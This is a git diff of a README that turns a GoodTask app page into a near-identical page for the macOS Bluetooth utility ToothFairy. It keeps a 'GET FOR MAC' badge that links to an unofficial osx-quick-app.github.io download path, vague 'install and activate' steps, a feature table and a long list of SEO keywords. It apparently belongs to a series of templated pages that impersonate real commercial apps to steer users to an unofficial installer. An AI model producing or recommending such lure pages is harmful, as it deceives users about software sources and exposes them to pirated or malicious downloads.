@@ -1,12 +1,12 @@
-# GoodTask – Smart Task Manager & To-Do Organizer
+# ToothFairy – Effortless Bluetooth Device Manager
 
 <div align="center">  
-  <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/32/85/24/32852495-8634-7b08-accb-c7a296c7b880/AppIcon-0-0-85-220-0-0-6-0-2x-sRGB.png/1200x630bb.png" width="250"/>  
+  <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/5b/8b/c7/5b8bc715-02ae-3cf1-e691-937c16f8f620/AppIcon-0-0-85-220-0-0-6-0-2x-sRGB.png/1200x630bb.png" width="250"/>  
 </div>  
 <br>  
 <div align="center">  
 
-[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-quick-app.github.io/.github/goodtask)  
+[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-quick-app.github.io/.github/toothfairy)  
 
 </div>  
 
@@ -15,24 +15,24 @@
 # Installation Instructions  
 
 1. Go To The Website Using The Button Above.  
-2. Follow The On-Screen Steps To Install And Activate GoodTask On Your Mac Device.  
+2. Follow The On-Screen Steps To Install And Activate ToothFairy On Your Mac Device.  
 
 ---  
 
 <div align="center">  
-  <img src="https://goodtaskapp.com/wp-content/uploads/2024/08/macimg2.png" width="1080"/>  
+  <img src="https://9to5mac.com/wp-content/uploads/sites/6/2018/08/ToothFairy.jpg?quality=82&strip=all" width="1080"/>  
 </div>  
 <br>  
 
 ## 🧩 Overview  
 
-**GoodTask for macOS** is a flexible and intelligent task manager designed for users who want complete control over their schedules. Built on top of Apple’s **Reminders** and **Calendar** frameworks, GoodTask takes simple to-do lists and elevates them into a powerful productivity system — perfect for professionals, students, and productivity enthusiasts alike.  
+**ToothFairy for macOS** is a lightweight utility designed to make connecting Bluetooth devices as fast and seamless as possible. Instead of navigating through multiple system menus, ToothFairy lets you connect or disconnect your AirPods, headphones, or other Bluetooth accessories with a single click or keyboard shortcut.  
 
-GoodTask lets you manage everything from simple reminders to complex project plans. Its clean and customizable interface helps you visualize your day, week, or month at a glance. With **smart lists**, **custom filters**, and **powerful automation options**, you can tailor your workflow to fit any productivity style — from **GTD (Getting Things Done)** to minimalist daily checklists.  
+The app lives quietly in your Mac’s menu bar, giving you instant access to your devices without clutter or complexity. It displays connection status, battery levels, and even allows custom icons for different gadgets — all while running efficiently in the background.  
 
-The app also supports **syncing across iCloud and other Apple devices**, ensuring all your tasks are always up to date. You can integrate tags, priorities, and recurring tasks, all while viewing them directly alongside your calendar events.  
+With **ToothFairy**, pairing Bluetooth devices feels as natural as plugging in a cable. It’s especially perfect for AirPods users who want faster connections or those who frequently switch between multiple wireless accessories throughout the day.  
 
-Optimized for **Apple Silicon**, **GoodTask** runs efficiently and integrates seamlessly with macOS widgets, shortcuts, and notifications — delivering a balance of simplicity and sophistication that makes staying organized feel effortless.  
+Optimized for **Apple Silicon** and **macOS Ventura or later**, ToothFairy delivers exceptional responsiveness, minimal resource usage, and reliable connectivity. Whether you’re connecting speakers, headphones, or controllers, **ToothFairy** makes Bluetooth management intuitive and effortless.  
 
 ---  
 
@@ -40,15 +40,15 @@ Optimized for **Apple Silicon**, **GoodTask** runs efficiently and integrates se
 
 | Feature                                      | Description                                                                 |
 |----------------------------------------------|------------------------------------------------------------------------------|
-| ✅ **Smart Lists & Filters**                   | Organize tasks dynamically with advanced sorting and filtering options.     |
-| 🧠 **Reminders & Calendar Integration**        | Combines Apple’s native reminders and calendar into one unified view.       |
-| 📅 **Multiple View Modes**                     | Switch between list, day, week, and month views for flexible planning.      |
-| 💡 **Quick Task Input**                        | Add new tasks instantly using natural language or shortcuts.                |
-| ⚙️ **Custom Automation Rules**                 | Create automatic repeat schedules and workflow triggers.                    |
-| 🔔 **Smart Notifications & Alerts**            | Stay on top of deadlines with detailed alerts and customizable reminders.   |
-| 🌈 **Themes & Personalization**                | Adjust colors, layouts, and icons to match your productivity style.         |
-| ☁️ **Cross-Device Sync**                       | Keep all tasks in sync across Mac, iPhone, iPad, and Apple Watch.           |
-| ⚡ **Optimized for Apple Silicon**              | Runs natively on M1/M2 Macs for faster performance and battery efficiency.  |
+| 🎧 **One-Click Bluetooth Connection**          | Instantly connect or disconnect any paired Bluetooth device.                 |
+| ⚡ **Custom Keyboard Shortcuts**               | Assign hotkeys for quick device toggling and hands-free control.             |
+| 🪶 **Menu Bar Integration**                    | Stay connected directly from your Mac’s menu bar with minimal interface.     |
+| 🔋 **Battery Level Indicator**                 | Monitor battery life of AirPods and Bluetooth devices in real time.          |
+| 🎨 **Custom Icons for Devices**                | Personalize device appearance with distinct icons.                           |
+| 💻 **Multi-Device Management**                 | Switch between multiple Bluetooth gadgets with ease.                         |
+| 🧠 **Apple Silicon Optimization**              | Native support for M1/M2 ensures fast and stable performance.                |
+| 🕶️ **Dark & Light Mode Support**               | Blends seamlessly with macOS visual themes.                                  |
+| 🔒 **Secure Bluetooth Pairing**                | Ensures reliable and private device connections with encrypted pairing.      |
 
 ---  
 
@@ -59,11 +59,11 @@ Optimized for **Apple Silicon**, **GoodTask** runs efficiently and integrates se
 | OS            | macOS 11.0 or later               |
 | Processor     | Apple Silicon (M1/M2) or Intel    |
 | Memory        | 2 GB RAM or higher                |
-| Storage       | 150 MB free disk space            |
+| Storage       | 50 MB free disk space             |
 | Display       | 1280×800 resolution or higher     |
 
 ---  
 
 ## 🏷️ Tags  
 
-goodtask • best task list app • good to do list apps • best todo app • best to do app • best to do list app • goodtask app • best checklist app • best personal task management app • best online to do list • best task tracker • best list app • best job scheduling software • apps for organizing tasks • best job scheduling app • best work task management app • the best to do list app • best to do list website • best shared to do list app • best daily task app • best calendar and to do list app • best shared task list app • best calendar and task app • best gtd app • best todo for mac • best task manager app for mac  
+toothfairy for macos • toothfairy software • toothfairy osx • toothfairy bluetooth • toothfairy app mac • tooth fairy macos • tooth fairy mac alternatives • tooth fairy app mac • mac toothfairy • mac tooth fairy • tooth fairy mac app • toothfairy macos • toothfairy mac app • toothfairy for mac • tooth fairy mac • toothfairy app • toothfairy mac  
